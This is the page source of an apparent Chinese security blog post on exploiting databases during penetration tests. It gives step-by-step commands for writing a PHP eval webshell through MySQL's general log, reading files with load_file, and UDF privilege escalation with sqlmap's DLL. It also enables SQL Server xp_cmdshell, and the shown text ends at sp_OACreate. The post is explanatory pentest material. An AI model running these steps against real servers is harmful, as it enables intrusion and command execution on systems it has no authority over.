@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>渗透测试数据库利用 | Wu_dalang</title><meta name="author" content="Wudalang"><meta name="copyright" content="Wudalang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="mysql使用mysql命令行客户端时，可以利用system函数执行系统命令。让 mysql 客户端所在的操作系统执行 whoami，所以回显是启动mysql客户端的用户   1mysql -e &quot;system whoami;&quot; -u 用户名 -p  写入webshell前提条件12数据库用户需要拥有 FILE 权限；root 用户通常拥有该权限；（FILE权限指的是对服务器主">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试数据库利用">
+<meta property="og:url" content="https://daxigua21.github.io/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Wu_dalang">
+<meta property="og:description" content="mysql使用mysql命令行客户端时，可以利用system函数执行系统命令。让 mysql 客户端所在的操作系统执行 whoami，所以回显是启动mysql客户端的用户   1mysql -e &quot;system whoami;&quot; -u 用户名 -p  写入webshell前提条件12数据库用户需要拥有 FILE 权限；root 用户通常拥有该权限；（FILE权限指的是对服务器主">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://daxigua21.github.io/img/conver11.png">
+<meta property="article:published_time" content="2026-05-04T11:17:35.000Z">
+<meta property="article:modified_time" content="2026-05-04T12:03:21.288Z">
+<meta property="article:author" content="Wudalang">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://daxigua21.github.io/img/conver11.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "渗透测试数据库利用",
+  "url": "https://daxigua21.github.io/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/",
+  "image": "https://daxigua21.github.io/img/conver11.png",
+  "datePublished": "2026-05-04T11:17:35.000Z",
+  "dateModified": "2026-05-04T12:03:21.288Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Wudalang",
+      "url": "https://daxigua21.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/star.png"><link rel="canonical" href="https://daxigua21.github.io/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '渗透测试数据库利用',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/config/css/transparancy.css"><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background-image: url(/img/b.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/conver11.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Wu_dalang</span></a><a class="nav-page-title" href="/"><span class="site-name">渗透测试数据库利用</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">渗透测试数据库利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-04T11:17:35.000Z" title="发表于 2026-05-04 19:17:35">2026-05-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-04T12:03:21.288Z" title="更新于 2026-05-04 20:03:21">2026-05-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(/img/conver11.png);"></div><article class="container post-content" id="article-container"><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><p>使用mysql命令行客户端时，可以利用system函数执行系统命令。让 mysql 客户端所在的操作系统执行 whoami，所以回显是启动mysql客户端的用户</p>
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260416191600512.png" class="">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -e "system whoami;" -u 用户名 -p</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库用户需要拥有 FILE 权限；root 用户通常拥有该权限；（FILE权限指的是对服务器主机上文件的访问） </span><br><span class="line">MySQL中的secure_file_priv参数不能为NULL状态。</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h4><p><code>secure_file_priv</code>参数使用来限制<code>load_file</code>,<code>SELECT ... INTO OUTFILE</code>,<code>SELECT ... INTO DUMPFILE</code>的</p>
+<p><code>secure_file_priv</code>为null，表示禁止读写操作</p>
+<p><code>secure_file_priv</code>为空，表示没有限制</p>
+<p><code>secure_file_priv</code>为具体目录时，表示只能对指定目录下的文件进行读写操作</p>
+<p>可以通过一下SQL语句查看该参数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@secure_file_priv;</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE 'secure_file_priv';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260416214413947.png" class="">
+
+<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p>向指定目录写入文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 'success' into outfile 'C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/test.txt';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260416221703555.png" class="">
+
+<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>查看mysql的日志功能是否开启，查看日志的路径</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like '%general%';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260422164102652.png" class="">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = ON; //开启日志功能</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file = 'd:/shell.php'; //设置日志路径</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL log_output = 'FILE'; //设置日志输出到文件里，参数还有TABLE、NONE、（FILE,TABLE）</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select '&lt;?php eval($_POST[1]);?&gt;'; //向日志文件写入webshell</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260422165258171.png" class="">
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260422165320257.png" class="">
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260422170641421.png" class="">
+
+<h4 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h4><p>开启 general log 将所有到达MySQL Server的SQL语句记录下来</p>
+<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><p>读取系统文件。同样被<code>secure_file_priv</code>参数限制</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file('C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/test.txt');</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT CAST(</span><br><span class="line">  LOAD_FILE('C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/test.txt')</span><br><span class="line">AS CHAR);</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONVERT(</span><br><span class="line">  LOAD_FILE('C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/test.txt')</span><br><span class="line">USING utf8mb4);</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260422172958883.png" class="">
+
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>UDF，用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。UDF的实现利用了动态链接库，.dll(windows)和.so(linux)文件。</p>
+<p>通过写入恶意的dll文件，然后使用MySQL的<code>CREATE FUNCTION</code>命令注册该函数，然后调用该函数即可在<strong>MySQL服务进程的权限</strong>下执行系统命令</p>
+<p>UDF文件存放的位置与mysql的版本有关</p>
+<h3 id="mysql-1"><a href="#mysql-1" class="headerlink" title="mysql<5.1"></a>mysql&lt;5.1</h3><p><code>C:/Winnt/udf.dll</code> 或者<code>C:/Windows/system32/udf.dll</code></p>
+<h3 id="Mysql-5-1"><a href="#Mysql-5-1" class="headerlink" title="Mysql >= 5.1"></a>Mysql &gt;= 5.1</h3><p>Mysql安装目录的lib\plugin文件夹下，如果mysql安装时不选择完整安装或使用集成开发环境等情况下lib\plugin目录大概率是不存在的，需要自行创建。</p>
+<h3 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h3><p>1.具有FILE(文件读写)、CREATE权限</p>
+<p>2.<code>secure_file_priv=空</code></p>
+<p>3.无webshell还需要INSERT权限、UPDATE权限、DELETE权限</p>
+<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><h4 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.user where user = substring_index(user(), '@', 1)\G;</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="查看secure-file-priv参数"><a href="#查看secure-file-priv参数" class="headerlink" title="查看secure_file_priv参数"></a>查看<code>secure_file_priv</code>参数</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE 'secure_file_priv';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260423173430939.png" class="">
+
+<h4 id="确定版本"><a href="#确定版本" class="headerlink" title="确定版本"></a>确定版本</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260423173616013.png" class="">
+
+<h4 id="确定mysql的安装目录"><a href="#确定mysql的安装目录" class="headerlink" title="确定mysql的安装目录"></a>确定mysql的安装目录</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like '%basedir%';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260423173540605.png" class="">
+
+<p>版本大于5.1，写入安装目录的<code>lib\plugin</code>目录,有webshell可以通过webshell上传udf.dll文件，在web目录不可写或者shell执行解析被限制的情况下就得通过数据库写入udf.dll文件</p>
+<h4 id="写入恶意dll文件"><a href="#写入恶意dll文件" class="headerlink" title="写入恶意dll文件"></a>写入恶意dll文件</h4><p>查看系统的信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like '%compile%';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260423205101084.png" class="">
+
+<p>根据对应的系统可以在sqlmap中找到对应的udf文件<code>\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_</code></p>
+<p>sqlmap中的udf文件为防止误杀默认是经过异或编码的，需先使用sqlmap自带的脚本解码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_</span><br></pre></td></tr></tbody></table></figure>
+
+<p>16进制编码一下，为了让二进制数据更稳定的传递</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file('D:\\lib_mysqludf_sys.dll')) into dumpfile 'D:\\lib_mysqludf_sys.txt';</span><br></pre></td></tr></tbody></table></figure>
+
+<p>由于mysql命令行有长度限制所以需要将16进制编码分成几部分写入表中，然后拼接</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table udf(data longblob);</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into udf(data) values();</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update udf set data=concat(data,)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>拼接完后将udf.dll写入对应的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select data from udf into dumpfile "D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname 'udf.dll';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260424204446155.png" class="">
+
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval("whoami");</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260424204623990.png" class="">
+
+<h4 id="删除函数"><a href="#删除函数" class="headerlink" title="删除函数"></a>删除函数</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>1.<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17">xp_cmdshell</a>是 SQL Server 中的一个扩展存储过程，它允许系统管理员通过操作系统命令行解释器执行给定的命令字符串，并以文本行的形式返回任何输出</p>
+<p>2.<code>xp_cmdshell</code> 默认通常是禁用状态。开启和直接调用它一般需要 <strong><code>sysadmin</code> 固定服务器角色权限</strong>，例如 <code>sa</code> 账户或其他 DBA 高权限账户， <code>xp_cmdshell</code> 可以使用基于策略的管理或执行 <code>sp_configure</code>来启用和禁用。</p>
+<p>3.<code>xp_cmdshell</code> 这个扩展存储过程<strong>定义在 <code>master</code> 数据库里</strong>，并且属于 <code>dbo</code> 架构，完整写法<code>master.dbo.xp_cmdshell</code></p>
+<h3 id="前提条件-2"><a href="#前提条件-2" class="headerlink" title="前提条件"></a>前提条件</h3><p>1.开启 xp_cmdshell 通常需要 sysadmin 固定服务器角色权限,例如<code>sa</code> 账户或其他 DBA 高权限账户</p>
+<p>2.SQL Server数据库没有被降权</p>
+<p><code>xp_cmdshell</code>执行系统命令是以SQL Server 服务当前运行账号的身份执行的，所以降权就会有很多限制</p>
+<h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="判断条件"><a href="#判断条件" class="headerlink" title="判断条件"></a>判断条件</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select is_srvrolemember('sysadmin');</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260430160718276.png" class="">
+
+<p><code>xp_cmdshell</code>可能被删除，如下sql语句查看<code>xp_cmdshell</code>是否存在，回显1为存在</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype = 'x' and name ='xp_cmdshell';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260430155007390.png" class="">
+
+<h4 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE master.dbo.xp_cmdshell 'whoami';</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260428215101780.png" class="">
+
+<h4 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h4><p>sql语句更改<code>sp_configure</code>，开启<code>xp_cmdshell</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260430154732587.png" class="">
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260430154752941.png" class="">
+
+<h2 id="OLE对象"><a href="#OLE对象" class="headerlink" title="OLE对象"></a>OLE对象</h2><p>OLE 是 Windows 里一套“让不同程序之间共享、嵌入、调用数据对象”的机制。</p>
+<p>一个应用程序创建的数据，被另一个应用程序嵌入或链接后，在目标程序里显示、保存，甚至还能双击后调用原程序编辑的对象就是OLE对象</p>
+<h3 id="sp-OACreate"><a href="#sp-OACreate" class="headerlink" title="sp_OACreate"></a>sp_OACreate</h3><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql?view=sql-server-ver17">sp_OACreate</a>创建OLE对象实例， <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/relational-databases/system-stored-procedures/sp-oamethod-transact-sql?view=sql-server-ver17">sp_OAMethod</a>调用OLE 对象的方法</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_OACreate { progid | clsid }</span><br><span class="line">    , objecttoken OUTPUT</span><br><span class="line">    [ , context ]</span><br><span class="line">[ ; ]</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2026/05/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/image-20260504165745665.png" class="">
+
